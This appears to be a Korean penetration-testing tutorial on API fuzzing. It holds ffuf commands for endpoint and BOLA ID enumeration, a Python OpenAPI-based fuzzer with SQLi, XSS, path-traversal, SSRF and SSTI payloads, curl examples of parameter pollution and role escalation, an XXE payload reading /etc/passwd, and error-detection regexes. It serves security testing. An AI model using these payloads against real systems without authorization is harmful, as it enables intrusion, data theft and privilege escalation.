# API 퍼징 — ffuf·OpenAPI 기반 자동 취약점 탐지

## 1. API 퍼징 개요

API 퍼징은 예상치 못한 입력을 자동으로 전송해 오류·예외·취약점을 탐지하는 기법이다.

| 퍼징 대상 | 탐지 취약점 |
|-----------|-------------|
| 경로 파라미터 | BOLA·경로 순회 |
| 쿼리 파라미터 | SQLi·XSS·SSRF |
| 요청 바디 | 인젝션·Mass Assignment |
| 헤더 | 헤더 인젝션·인증 우회 |
| HTTP 메서드 | 미인가 메서드 노출 |

---

## 2. ffuf로 API 엔드포인트 발견

### 2.1 경로 퍼징

```bash
# API 경로 발견
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://api.target.com/FUZZ \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,301,302,403 \
  -o endpoints.json -of json

# 버전별 경로 퍼징
ffuf -w versions.txt:VER -w paths.txt:PATH \
  -u https://api.target.com/VER/PATH \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,403

# 숨겨진 파라미터 퍼징 (arjun 스타일)
ffuf -w params.txt \
  -u "https://api.target.com/v1/users?FUZZ=1" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -fs 0
```

### 2.2 ID 기반 BOLA 퍼징

```bash
# BOLA — 숫자 ID 퍼징
seq 1 10000 | ffuf -w - \
  -u "https://api.target.com/v1/users/FUZZ/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -t 50

# UUID 퍼징 (미리 생성된 리스트 사용)
ffuf -w uuid_list.txt \
  -u "https://api.target.com/v1/documents/FUZZ" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,403
```

---

## 3. OpenAPI 기반 자동 퍼저

```python
#!/usr/bin/env python3
"""OpenAPI/Swagger 명세 기반 API 자동 퍼저."""

import argparse
import json
import random
import string
from pathlib import Path
from typing import Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx
import yaml


def load_spec(path_or_url: str) -> dict:
    if path_or_url.startswith("http"):
        with httpx.Client(verify=False) as client:
            resp = client.get(path_or_url, timeout=15)
            content = resp.text
    else:
        content = Path(path_or_url).read_text()

    if path_or_url.endswith(".yaml") or path_or_url.endswith(".yml"):
        return yaml.safe_load(content)
    return json.loads(content)


def generate_fuzz_values(schema: dict) -> list[Any]:
    """스키마 타입에 맞는 퍼징 값 생성."""
    type_ = schema.get("type", "string")
    values: list[Any] = []

    match type_:
        case "string":
            values = [
                "",
                "a" * 10000,  # 버퍼 오버플로우
                "' OR '1'='1",  # SQLi
                "<script>alert(1)</script>",  # XSS
                "../../etc/passwd",  # 경로 순회
                "http://169.254.169.254/",  # SSRF (AWS 메타데이터)
                "%00",  # Null byte
                "${7*7}",  # SSTI
                "{{7*7}}",  # Jinja SSTI
            ]
        case "integer" | "number":
            values = [0, -1, 2**31 - 1, 2**63 - 1, -2**63, 99999999999]
        case "boolean":
            values = [True, False, "true", "false", 1, 0]

    return values


def extract_endpoints(spec: dict) -> list[dict]:
    """OpenAPI 명세에서 엔드포인트 추출."""
    endpoints = []
    base_url = ""

    if "servers" in spec:
        base_url = spec["servers"][0].get("url", "")

    for path, path_item in spec.get("paths", {}).items():
        for method, operation in path_item.items():
            if method not in ("get", "post", "put", "delete", "patch"):
                continue
            endpoints.append({
                "method": method.upper(),
                "path": path,
                "operation": operation,
                "base_url": base_url,
            })

    return endpoints


def fuzz_endpoint(
    endpoint: dict,
    token: str | None,
    base_url_override: str | None = None,
) -> list[dict]:
    results = []
    base = base_url_override or endpoint["base_url"]
    path = endpoint["path"]
    method = endpoint["method"]
    operation = endpoint["operation"]

    headers: dict[str, str] = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    params_spec = operation.get("parameters", [])
    body_spec = operation.get("requestBody", {})

    body_schema = (
        body_spec.get("content", {})
        .get("application/json", {})
        .get("schema", {})
    )

    fuzz_values = ["' OR '1'='1", "<script>", "../../etc/passwd", "a" * 5000, ""]

    with httpx.Client(verify=False) as client:
        # 경로 파라미터 퍼징
        path_params = [p for p in params_spec if p.get("in") == "path"]
        for param in path_params:
            for val in fuzz_values:
                test_path = path.replace(f"{{{param['name']}}}", str(val))
                try:
                    resp = getattr(client, method.lower())(
                        f"{base}{test_path}", headers=headers, timeout=10
                    )
                    if resp.status_code == 500:
                        results.append({
                            "type": "path_param_error",
                            "path": test_path,
                            "param": param["name"],
                            "value": val,
                            "status": resp.status_code,
                        })
                except httpx.RequestError:
                    pass

        # 바디 퍼징
        if body_schema and method in ("POST", "PUT", "PATCH"):
            for val in fuzz_values:
                test_body = {
                    k: val for k in body_schema.get("properties", {}).keys()
                }
                try:
                    resp = getattr(client, method.lower())(
                        f"{base}{path}", json=test_body, headers=headers, timeout=10
                    )
                    if resp.status_code == 500:
                        results.append({
                            "type": "body_error",
                            "path": path,
                            "value": str(val)[:50],
                            "status": resp.status_code,
                        })
                except httpx.RequestError:
                    pass

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="OpenAPI 기반 API 퍼저")
    parser.add_argument("spec", help="OpenAPI 명세 경로 또는 URL")
    parser.add_argument("-t", "--token", help="인증 토큰")
    parser.add_argument("-b", "--base-url", help="베이스 URL 오버라이드")
    parser.add_argument("-w", "--workers", type=int, default=10, help="병렬 워커 수")
    parser.add_argument("-o", "--output", type=Path, help="결과 저장 경로")
    args = parser.parse_args()

    print(f"[*] 명세 로딩: {args.spec}")
    spec = load_spec(args.spec)
    endpoints = extract_endpoints(spec)
    print(f"[*] 엔드포인트 {len(endpoints)}개 발견")

    all_results: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(fuzz_endpoint, ep, args.token, args.base_url): ep
            for ep in endpoints
        }
        for future in as_completed(futures):
            ep = futures[future]
            results = future.result()
            if results:
                print(f"[!] {ep['method']} {ep['path']}: {len(results)}개 이슈")
                all_results.extend(results)

    print(f"\n총 {len(all_results)}개 이슈 발견")
    if args.output:
        args.output.write_text(json.dumps(all_results, indent=2, ensure_ascii=False))
        print(f"결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 4. 파라미터 오염 (HPP)

```bash
# HTTP Parameter Pollution
# 동일 파라미터 중복 전송
curl -s "https://api.target.com/v1/transfer?to=attacker&to=victim&amount=100" \
  -H "Authorization: Bearer $TOKEN"

# POST 바디와 쿼리 스트링 충돌
curl -s -X POST "https://api.target.com/v1/transfer?role=user" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","amount":1000}'
```

---

## 5. 콘텐츠 타입 혼동

```bash
# JSON → XML 콘텐츠 타입 혼동
curl -s -X POST https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>'

# multipart/form-data로 JSON 파라미터 우회
curl -s -X POST https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -F 'data={"role":"admin","name":"test"};type=application/json'
```

---

## 6. 응답 분석 패턴

```python
#!/usr/bin/env python3
"""API 응답 이상 탐지 — 오류 패턴 분석."""

import re
from dataclasses import dataclass

ERROR_PATTERNS = {
    "sql_error": re.compile(
        r"SQL syntax|mysql_fetch|ORA-\d+|sqlite3\.|PostgreSQL.*ERROR",
        re.IGNORECASE,
    ),
    "stack_trace": re.compile(
        r"at \w+\.\w+\(|Traceback \(most recent|Exception in thread",
        re.IGNORECASE,
    ),
    "path_disclosure": re.compile(
        r"[A-Z]:\\|/var/www/|/home/\w+/|/usr/local/",
    ),
    "internal_ip": re.compile(
        r"192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",
    ),
}


@dataclass
class ResponseIssue:
    issue_type: str
    match: str
    endpoint: str
    status_code: int


def analyze_response(
    endpoint: str, status_code: int, body: str
) -> list[ResponseIssue]:
    issues: list[ResponseIssue] = []
    for issue_type, pattern in ERROR_PATTERNS.items():
        m = pattern.search(body)
        if m:
            issues.append(ResponseIssue(issue_type, m.group(0)[:100], endpoint, status_code))
    return issues
```

---

## 7. 주요 API 퍼징 도구

| 도구 | 특징 |
|------|------|
| `ffuf` | 고속 웹 퍼저, API 경로 발견 |
| `wfuzz` | 복잡한 퍼징 시나리오 |
| `arjun` | 숨겨진 HTTP 파라미터 발견 |
| `kiterunner` | OpenAPI 기반 경로 발견 |
| `nuclei` | API 취약점 템플릿 스캔 |
| `Burp Intruder` | GUI 기반 정밀 퍼징 |
| `RESTler` | AI 기반 REST API 퍼저 (Microsoft) |
